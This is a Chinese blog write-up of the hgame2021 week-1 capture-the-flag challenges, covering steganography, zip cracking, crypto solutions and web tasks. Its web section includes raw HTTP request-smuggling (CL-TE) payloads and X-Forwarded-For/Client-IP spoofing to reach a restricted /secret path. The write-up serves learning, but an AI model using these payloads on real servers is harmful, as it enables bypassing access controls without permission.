---
title: hgame2021 -week 1
categories: 赛题wp
---
## Misc1 - Base全家福
- base加密


![](https://img-blog.csdnimg.cn/20210204223446423.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
base 64 32 16
<!--more-->
![](https://img-blog.csdnimg.cn/20210204223514401.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

---

## Misc2 - 不起眼压缩包的养成的方法
- 图片隐写+明文攻击

给了一张图片，binwalk分离一下
![](https://img-blog.csdnimg.cn/20210204223718301.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
![](https://img-blog.csdnimg.cn/20210204223911370.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
提示有8位数字，apr暴力破解
70415155


发现又有一个password文档跟第一个zip中的文件相同，所以压缩后明文攻击
Ps:以为能拖进去的，然后耽误了半天时间，一定要手动添加明文路径

![](https://img-blog.csdnimg.cn/20210204224009164.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
![](https://img-blog.csdnimg.cn/20210204224021836.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
十六进制转字符串

![](https://img-blog.csdnimg.cn/20210204224032289.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
![](https://img-blog.csdnimg.cn/20210204224111361.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

---

## Misc3 - Galaxy
- 流量分析提取文件+修改png高度

![](https://img-blog.csdnimg.cn/20210204224243352.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
导出http文件，save

![](https://img-blog.csdnimg.cn/20210204224307831.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
Tweakpng修改高度


![](https://img-blog.csdnimg.cn/2021020422433139.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
![](https://img-blog.csdnimg.cn/20210204224344346.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

---

## Misc4 - Word RE:MASTER
- word  brainfuck snow隐写

给了两个word文档，010打开发现是压缩包格式，第二个word需要密码打开
将第一个改为.zip

![](https://img-blog.csdnimg.cn/20210207220817346.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
![](https://img-blog.csdnimg.cn/20210207220831349.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

根据密码提示去除隐藏文字 格式等

![](https://img-blog.csdnimg.cn/20210207220933174.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
可以看到有制表符与空格，图片给了提示snow隐写，将制表符与空格复制到1.txt
在终端下使用命令 snow.exe -C 1.txt


![](https://img-blog.csdnimg.cn/20210207221007122.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)




---


## web1 - Hitchhiking_in_the_Galaxy
- 修改数据包头部信息

提示method错误
将get改为post

![](https://img-blog.csdnimg.cn/20210204224802866.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
使用无限…访问，改ua为Infinite Improbability Drive

![](https://img-blog.csdnimg.cn/20210204224827425.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
Referer
referer在请求包的head中，作用是告诉服务器“我”是从哪个链接过来的
修改referer为https://cardinal.ink/


![](https://img-blog.csdnimg.cn/20210204225005138.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
通过本地访问
添加XFF为127.0.0.1


![](https://img-blog.csdnimg.cn/20210204225057416.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
![](https://img-blog.csdnimg.cn/20210204225104480.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

---
## web2 - watermelon
- js审查 / 动手能力

谷歌浏览器打开 切换到移动端 修改长度后挺简单2000分的

![](https://img-blog.csdnimg.cn/20210204225313555.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
二：js代码里面仔细找到一串base64

- 以后可以搜索一些alert之类的代码查询到关键词


![](https://img-blog.csdnimg.cn/20210204225451840.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

---

## web3 - 宝藏走私者(X)
[HTTP走私](https://paper.seebug.org/1048/)

- HTTP Smuggling CL-TE
![](https://img-blog.csdnimg.cn/20210207224509831.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
该版本存在 HTTP Smuggling CL-TE 漏洞
会将请求漏给后端服务器，造成走私

```bash
POST / HTTP/1.1
Host: hrs.localhost
Content-Length: 73
Transfer-Encoding: chunked

0

GET /secret HTTP/1.1
Host: hrs.localhost
Client-IP: 127.0.0.1
```

---
## web4 - 走私者得愤怒

 同web3一样
```bash
POST / HTTP/1.1
Host: hrs.localhost
Content-Length: 100
Transfer-Encoding: chunked


0

POST /secret HTTP/1.1
Host: hrs.localhost
Client-IP: 127.0.0.1
Content-Length: 20
233
```

---


## web5 - 智商检测鸡
在线硬算100道
![](https://img-blog.csdnimg.cn/20210204225806351.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
![](https://img-blog.csdnimg.cn/2021020422581239.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

wp：
这道题⽬通过 session 记录每个⼈做题的进度，有兴趣的同学可以去了解⼀下 [Flask的session机制及session伪造](https://www.secpulse.com/archives/97707.html)
题⽬是通过 JQuery 异步访问后端 api 获取 JSON 数据来进⾏前后端交互的。在 fuckmath.js 中⼀共能
找到四个后端 api ，可以使⽤ BurpSuite 抓包进⾏分析⼀下各个接口的作⽤和交互⽅法：

>获取当前解题进度： GET /api/getStatus

```bash
{
   "solving":0
}
```

>获取题⽬内容： GET /api/getQuestion

```bash
{
  "question":"<math><mrow><msubsup><mo>\u222b</mo><mrow><mo>-</mo><mn>92</mn>
  </mrow><mrow><mn>31</mn></mrow></msubsup><mo>(</mo><mn>12</mn><mi>x</mi><mo>+
  </mo><mn>17</mn><mo>)</mo><mtext><mi>d</mi></mtext><mi>x</mi><mtd/></mrow>
  </math>"
}
```

>验证答案： POST /api/verify

Request:
```bash
{
   "answer":-42927
}
```

Respond:

```bash
{
  "result":true
}
```

> 获取flag： GET /api/getFlag

```bash
{
  "flag":"hgame{xxxxxxxxxxxxx}"
}
```

所以思路很简单了，获取题⽬ => 解析MathML => 计算 => 验证 => 继续获取解题
发送 HTTP 请求⼀般使⽤ requests 库
解析并计算积分的⽅法有很多

exp:

```bash
import sympy
import requests
import re
import json
 
url = "http://r4u.top:5000"
api = {
	"verify": "/api/verify",
	"question": "/api/getQuestion",
	"status": "/api/getStatus",
	"flag": "/api/getFlag"
}
def calculate(question):
	para_pattern = "(<mo>[-+]</mo><mn>[0-9]+</mn>)|(<mn>[0-9]+</mn>)"
	matches = re.findall(para_pattern, question)
	paras = []
	for match in matches:
		if match[0] == '':
			para = match[1]
		else:
			para = match[0]
		para = re.sub('<[^>]*>', '', para)
		paras.append(float(para))
	x = sympy.Symbol('x')
	f = paras[2]*x+paras[3]
	return int(sympy.integrate(f, (x, paras[0], paras[1]))*10) / 10


# 开启session
session = requests.session()


for i in range(0, 100):
	mathML = session.get(url=url+api['question']).json()['question']
	data = {
		"answer": calculate(mathML)
	}
	headers = {'Content-Type': 'application/json'}
	res = session.post(url=url+api['verify'], data=json.dumps(data),
headers=headers)
	if not res.json()['result']:
		print(data)
		print(i)
		exit(1)
	else:
		print(i)
		print(data)
status = session.get(url+api['status']).json()['solving']
if status == 100:
	print(session.get(url+api['flag']).json()['flag'])
else:
	print('something wrong')
```

## pwn1 - whitegive
⽤等号⽐较字符串，⽐较的是地址（其实我个⼈不赞同这个说法，更认同 "xxxx"
这种东西本⾝就是⼀个指针，值就是⼀个表⽰地址的数字，地址指向的地⽅存有 xxxx 而已）
所以逻辑很简单，输⼊正确的整数（地址）就能拿到shell了

![](https://img-blog.csdnimg.cn/20210207230115679.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
转十进制，再nc

![](https://img-blog.csdnimg.cn/20210207230146348.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

---

## Crypto1 まひと

![](https://img-blog.csdnimg.cn/20210207231020928.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)

加密过程：

hgame{cL4Ss1Cal_cRypTO9rAphY+m1X~uP!!}

凯撒 13
utnzr{pY4Ff1Pny_pElcGB9eNcuL+z1K~hC!!}

`逆 序`
}!!Ch~K1z+LucNe9BGclEp_ynP1fF4Yp{rzntu

栅栏 6
}KccnYt!1NlPpu!zeE1{C+9pfrhLB_Fz~uGy4n

Vigenere-Liki
Vigenere-Liki:}VkmvJb!1XtAxe!hpM1{M+9xqzrTM_Nj~cRg4x

b64
VmlnZW5lcmUtTGlraTp9VmttdkpiITFYdEF4ZSFocE0xe00rOXhxenJUTV9Oan5jUmc0eA==

ascii

mores

>解完维吉尼亚之后，可以从格式下⼿，为了拼凑格式就要⽤栅栏换位，但是
⼀般的栅栏密码的第⼀个位置的字符是不变的，也就是第⼀个字符⼀直是 "}"，但是按理来说这是 flag
的最后⼀个字符，就很容易想到`逆序`，那只需要拼凑格式成 "}xxxxxxxxxxx{xxxxx"，再逆序就是 flag 的
格式 "xxxxx{xxxxxxxxxxxx}"，然后再凯撒就⾏了

ps:想到了栅栏，但是没想到逆序，学到了


---

## Crypto2  Transformers
- 词频分析，替换密码

wp：

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210207231807722.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center)
给出⼀个单独的密⽂和⼀个明⽂密⽂对，但由于经过打乱（碎⽚），因此考虑做⼀下词
频分析，很容易发现两边的词频有对应关系，组合成字典，去解那个单独的密⽂就可以

```c
from collections import Counter
from prettyprinter import pprint
import os

enc_path = "./data/enc"
ori_path = "./data/ori"

enc_content = ""
ori_content = ""

for root, dirs, files in os.walk(enc_path):
	for file in files:
		with open(enc_path+"/"+file, "r",encoding="utf8") as e:
			enc_content += e.read()
for root, dirs, files in os.walk(ori_path):
	for file in files:
		with open(ori_path+"/"+file, "r",encoding="utf8") as e:
			ori_content += e.read()
C_enc = Counter(enc_content)
C_ori = Counter(ori_content)
#pprint(C_ori.most_common(len(C_ori.keys())))
#pprint(C_enc.most_common(len(C_enc.keys())))

orilist = C_ori.most_common(len(C_ori.keys()))
enclist = C_enc.most_common(len(C_enc.keys()))

ori_ss = ""
enc_ss = ""

for item in orilist:
	if item[0].isalpha():
		ori_ss += item[0]
for item in enclist:
	if item[0].isalpha():
		enc_ss += item[0]
print(ori_ss)
print(enc_ss)

mmap = str.maketrans(enc_ss, ori_ss)
with open("./data/Transformer.txt", "r",encoding="utf8") as e:
	print(e.read().translate(mmap))
```

---
## Crypto3 对称之美
wp:

- 异或运算，MTP
- 考点是XOR+MTP，XOR是⼀种对称的运算，所以叫对称之美
简单看看可以发现密钥是循环利⽤的⼀组 16 位随机字符串
于是我们将cipher⼗六个⼀组打散

```c
cipher=b''

length = len(cipher)
t = length // 16

f = open("cipher.ciphertexts", "w")
for i in range(0, t):
	print(cipher[i * 16 : (i + 1) * 16].hex(), file=f)
print(cipher[t * 16 : -1].hex(), file=f)

f.close()
```
利⽤[MTP](https://github.com/CameronLonsdale/MTP)⼯具求解
明⽂是⼀段包含 flag 的英⽂⽂献
⾃⼰写脚本也是可以的，准确率还是可以确定很多位的。
然后剩下的不确定的位⾥，试⼀下哪个放进去得到的⽂明上下⽂⽐较连贯⽐较可⾏就选那个就⾏

---

## 完整wp
[hgame2021 week-1](https://share.weiyun.com/18YJudJk)
